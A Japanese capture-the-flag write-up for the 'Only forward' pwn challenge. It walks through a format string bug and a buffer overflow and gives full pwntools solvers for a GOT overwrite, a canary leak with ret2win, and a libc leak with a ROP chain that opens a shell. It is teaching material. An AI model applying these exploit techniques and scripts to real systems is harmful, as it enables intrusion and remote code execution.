# Only forward

## / Overview

スタックカナリアをテーマにした3つの解法

1. `__stack_chk_fail@got`を`win()`に書き換えて、カナリア破壊
2. FSBによるカナリアリークでret2win
3. 2 + libcベースリークからROPでRCE

配布ファイル`chal.c`には2つの脆弱性があります。1つは`printf(name)`の Format String Bug、もう一つは`read(0, buf, 256)`の Buffer Overflow です。

セキュリティ機構は以下の通りです。

```
$ checksec ./chal
[*] '/only-forward/chal'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

また、後ほど判明しますが、ASLRも有効です。

## / Writeup

### 1. GOT Overwrite

最も簡単な解法は FSB による GOT Overwrite です。

`printf(name)`には`%p`と`%n`を使った読み取りと書き込みの危険性があります。

まずは`%p`を使って何ができるか紹介します。`What's your name?`に続いて`name`に以下の値を入力します。

```
What's your name?
AAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
Hello!
AAA.0x7ffff7e04643.(nil).0x7ffff7d1c5a4.0x6.0x7ffff7fca380.0x252e70252e414141.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x7fffffff0a70
���
```

出力されるのは「レジスタ」と「nameの先頭からのスタックの値」です。どういうことかと言うと、`%p`を連続して呼び出すと、次の場所の値が順番に出力されます。

1. RSI (レジスタ)
2. RDX (レジスタ)
3. RCX (レジスタ)
4. R8 (レジスタ)
5. R9 (レジスタ)
6. RSP (スタック)
7. RSP + 1 (スタック)
8. RSP + 2 (スタック)
...

このように6番目の`%p`以降はスタックの値を`RSP`から8バイトずつ下に読んでいきます。ちなみに1~5番目のレジスタを読み飛ばしたいときは6番目の値から`%6$p`と指定して読むこともできます。

先程の出力結果を振り返ると`%6$p`の値が`0x252e70252e414141`になっています。これはRSPの場所がちょうど`name`の先頭アドレスと一致しており、nameへの文字列の書き込みは`%6$p`から行われていることを意味します。

この作業で`name`までのオフセットが特定できたので、pwntoolsを用いた GOT Overwrite ができます。

1. `__stack_chk_fail@got`に`win()`のアドレスを書き込む
2. わざとカナリアを破壊する
3. `win()`が呼ばれる

具体的なSolverは以下の通りです。

<details><summary> solve.py </summary>

```py
from pwn import *

elf = ELF('./chal')
p = remote('34.170.146.252', 17263)
context.arch = 'amd64'

win_addr = elf.symbols['win']
canary_got = elf.got['__stack_chk_fail']
print(f'{win_addr = }')
print(f'{canary_got = }')

payload = fmtstr_payload(6, {canary_got: win_addr}) # fmtstr_payload(offset, {書き換え先: 書き換えデータ})
print(f'{payload = }')

p.recvuntil(b'What\'s your name?')
p.send(payload)
p.recvuntil(b'Tell me something:')
p.sendline(b'A'*128)
print(p.recvall())
```

</details>

> [!NOTE]
> ここからはペイロードの解説をします。興味がない方は次の解法まで飛んでください。

このプログラムでは構築されるペイロードも出力される設定にしているので、実際の値を見てみましょう。

```py
win_addr = 0x4012a4
canary_got = 0x404010
payload = b'%164c%11$lln%110c%12$hhn%46c%13$hhnaaaab\x10@@\x00\x00\x00\x00\x00\x11@@\x00\x00\x00\x00\x00\x12@@\x00\x00\x00\x00\x00'
```

ペイロードを説明の為に8バイト区切りに整形して、右側にオフセットを付与します。

| スタック上の値 | オフセット |
| --- | --- |
| %164c%11 | 6 |
| $lln%110 | 7 |
| c%12$hhn | 8 |
| %46c%13$ | 9 |
| hhnaaaab | 10 |
| \x10@@\x00\x00\x00\x00\x00 | 11 (重要) |
| \x11@@\x00\x00\x00\x00\x00 | 12 (重要) |
| \x12@@\x00\x00\x00\x00\x00 | 13 (重要) |


`%<num>c`はnumバイトのパディングを生成する書式です。続く`%<num>$n`は、オフセット`num`の場所のデータをアドレスと解釈して、そこに`%<num>$n`以前のデータの長さを書き込みます。

今回の例で言うと始めの12バイトは`%164c%11$lln`で、これは164バイトのパディングの長さ(164)を`11`番目のオフセットのアドレス (`\x10@@\x00\x00\x00\x00\x00`はリトルエンディアンで`0x404010`) にlong long 型、つまり8バイトとして書き込んでいます。これによってアドレス`0x404010`のデータは`0x00000000000000a4`に書き換えられます。

次の`%110c%12$hhn`はオフセット`12`のアドレス(`0x404010`)にこれまでの164に110を加えた274(`0x112`)のhalf half、つまり1バイト(`0x12`)として書き込みます。これでアドレス`0x404010`のデータは`0x00000000000012a4`に書き換えられます。

同様に`%46c%13$hhn`で`0x00000000004012a4`になります。

これで`0x404010`の`__stack_chk_fail@got`の値を`0x4012a4`の`win()`のアドレスに書き換えることができています。

また。ペイロードはたまたまかも知れませんがギリギリ64バイトに収まっているため、有効です。

### 2. カナリアの回避

前節ではFSBの仕組みを解説しました。

`%6$p`が`name`の先頭を指すことが分かったので、スタック上のカナリアの値を読み取ることもできます。事前準備としてカナリアが有効である場合のメモリレイアウトについて説明します。

```text
高アドレス
+----------------------+
| リターンアドレス       |
+----------------------+
| Saved RBP            |
+----------------------+
| Stack Canary         | ← 関数終了時に値を検査
+----------------------+
|                      |
|     local values     |
|                      |
+----------------------+
低アドレス
```

カナリアは`RBP-8`の位置にあることが分かります。そのため`buf`でリターンアドレスを書き換えようとすると、カナリアも書き換えられてしまい、プログラムが強制終了します。しかしFSBでカナリアの値をリークできれば、この問題も解決します。

では`name`の先頭が、`RBP`からどのくらいオフセットがあるか調べます。gdbで`disas vuln`と打つと、アセンブリを見ることができます。以下は`name`を書き込み先として`read()`の`RSI`にセットしている様子です。

```
disas vuln
Dump of assembler code for function vuln:
   0x0000000000401384 <+0>:     endbr64
   # --snip--
   0x00000000004013b1 <+45>:    lea    rax,[rbp-0x90]
   0x00000000004013b8 <+52>:    mov    edx,0x40
   0x00000000004013bd <+57>:    mov    rsi,rax
   0x00000000004013c0 <+60>:    mov    edi,0x0
   0x00000000004013c5 <+65>:    call   0x401110 <read@plt>
   # --snip--
```

これより`name`の先頭は`RBP-0x90`であることが分かりました。カナリアのオフセットは`0x90-0x08`です。これは`%6$p`から17ワード先です。よって`%23$p`がカナリアの値になります。

これを ret2win のペイロードに組み込みます。同じアセンブリから`buf`の先頭は`RBP-0x50`であることも分かるため、カナリアの値は`buf + 0x48`にセットします。

```py
payload  = b'A'*0x48
payload += p64(canary_value)
payload += b'A'*8 
payload += p64(win_addr)
```

全体のSolverを以下に示します。

<details><summary> solve2.py </summary>

```py
from pwn import *

elf = ELF('./chal')
p = remote('34.170.146.252', 17263)
context.arch = 'amd64'

win_addr = elf.symbols['win']

p.recvuntil(b'What\'s your name?')
p.send(b'%23$p')
p.recvline()
p.recvline()
canary_value_hex = p.recvline()[:18]
canary_value = int(canary_value_hex, 16)
p.recvuntil(b'Tell me something:')

payload  = b'A'*0x48
payload += p64(canary_value)
payload += b'A'*8 
payload += p64(win_addr)

p.sendline(payload)
print(p.recvall())
```

</details>

### 3. libcベースリーク

流れだけ先に説明します。

1. カナリア回避で`vuln`のリターンアドレスに`main()`をセットする
2. もう一度`vuln()`が呼ばれる
3. `__libc_start_call_main+122`のアドレスをFSBでリーク。同じカナリアの値で、もう一度`main()`に戻る
4. `vuln()`が呼ばれる
5. リモートと同じ`libc.so.6`を用意して、`__libc_start_call_main+122`とのオフセットを計算する
6. `libc.so.6`からROPに必要なガジェット(`system`, `/bin/sh`, `pop rdi; ret`)を見つける
7. BOFでカナリア回避しつつ、ROPを組む

では順番に詳細を解説します。

#### 1. カナリア回避で`vuln`のリターンアドレスに`main()`をセットする

これは前節と同様で`win()`の代わりに`main()`をセットすることで、もう一度`main()`を実行できます。つまり`vuln()`で FSB, BOF をもう一度できます

#### 3. `__libc_start_call_main+122`のアドレスをFSBでリーク

`vuln()`から見えるのは`vuln()`のスタックだけではありません。それより高位のアドレスには`main()`のスタックの値があります。とりわけ`main()`のリターンアドレスにはlibc内の関数`__libc_start_call_main`のアドレスが入っています。

この値を読むことができて、なおかつリモートと同様のlibcを用意できればオフセットが計算できることになり、ROP のための豊富なガジェットを使い放題できます。

まずは`name`から`main()`のリターンアドレスまでのオフセットを調べます。gdb内で`main()`と`vuln()`の`ret`にブレークポイントを張り、それぞれのアドレスを調べます。筆者は pwndbg を使っているため、停止時の`RSP`が自動で表示されます。

* vulnのリターンアドレス 0x7fffffffdcc8
* mainのリターンアドレス 0x7fffffffdce8

さらにシンボルが残っているため、`__libc_start_call_main+122`の値がリターンアドレスになっていることも分かりました。

計算すると`%29$p`が`main()`のリターンアドレスに対応していることが分かります。この値を一度見てみましょう。

```
0x7ffff7c2a1ca
```

> [!IMPORTANT]
> ここで筆者の見落としポイントが1つありました。それは、`main()`を繰り返し呼ぶことで、このオフセットがどんどん大きくなるということです。一度、ASLRをオフにしてlibcのアドレスを固定し、`main()`を呼び出すごとのオフセットの増分を調べました。調査の結果`+3`ずつ増加することが分かりました。

次にリモートと同じlibcを用意します。Dockerを起動し、コンテナ内の`chal`に対して`ldd chal`を実行します。`/lib/x86_64-linux-gnu/libc.so.6`を使っている事がわかったので`docker cp`でローカルに持ってきます。これで材料は揃いました。

と、思ったらもう一つ問題がありました。`libc.so.6`内に`__libc_start_call_main`のシンボルがありません。AIに聞くと`__libc_start_call_main`はstatic関数であり、シンボルテーブルにエクスポートされないようです。

しかしこの様な場合でも、BuildIDからDebug情報付きのlibcを得ることができます。

```
$ file ./libc.so.6
./libc.so.6: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=8e9fd827446c24067541ac5390e6f527fb5947bb, for GNU/Linux 3.2.0, stripped

$ apt-get install -y libc6-dbg
# --snip--

# BuildIDの上二桁がフォルダ名、残りがファイル名
$ cp /usr/lib/debug/.build-id/8e/9fd827446c24067541ac5390e6f527fb5947bb.debug ./

$ readelf -s -W 9fd827446c24067541ac5390e6f527fb5947bb.debug | grep '__libc_start_call_main'
6: 000000000002a150   164 FUNC    LOCAL  DEFAULT   17 __libc_start_call_main
```

無事シンボルを得ることができて、アドレスが`0x2a150`でした。これを+122して`0x2a1ca`がlibc側のオフセットになります。

長いこと説明しましたが、これで本当に全ての材料が揃いました。`libc.address = <バイナリ内の__libc_start_call_main+122> - <libc.so.6内の__libc_start_call_main+122>`でオフセットを合わせてくれるので、後はROPチェーンを組んで終わりです。

<details><summary> solve3.py </summary>

```py
from pwn import *

elf = ELF('./chal')
libc = ELF('./libc.so.6')

p = remote('34.170.146.252', 17263)

context.arch = 'amd64'

main_addr = elf.symbols['main']
libc_start_call_main_122 = 0x2a1ca  # __libc_start_call_main+122

# ================ カナリアリーク + mainに戻る
p.recvuntil(b"What's your name?\n")
p.send(b'%23$p')
p.recvuntil(b"Hello!\n")
leaked = p.recvline().strip()
canary_value = int(leaked[:18], 16)
p.recvuntil(b'Tell me something:\n')

payload = b'A'*0x48 + p64(canary_value) + b'A'*8 + p64(main_addr)
p.send(payload)

# ================ libcリーク + mainに戻る
p.recvuntil(b"What's your name?\n")
p.send(b'%32$p') # 2回目なので+3する
p.recvuntil(b"Hello!\n")
leaked = p.recvline().strip()
libc_leak = int(leaked[:14], 16)
p.recvuntil(b'Tell me something:\n')

payload = b'A'*0x48 + p64(canary_value) + b'A'*8 + p64(main_addr)
p.send(payload)

# ================ ROPチェーンでsystem("/bin/sh")
libc.address = libc_leak - libc_start_call_main_122

rop_libc = ROP(libc)
pop_rdi = rop_libc.find_gadget(['pop rdi', 'ret']).address
ret     = rop_libc.find_gadget(['ret']).address
bin_sh  = next(libc.search(b'/bin/sh'))
system  = libc.symbols['system']

p.recvuntil(b"What's your name?\n")
p.send(b'A')
p.recvuntil(b'Tell me something:\n')

payload  = b'A'*0x48
payload += p64(canary_value)
payload += b'A'*8
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system)

p.send(payload)
# ================ シェル起動
p.interactive()
```

</details>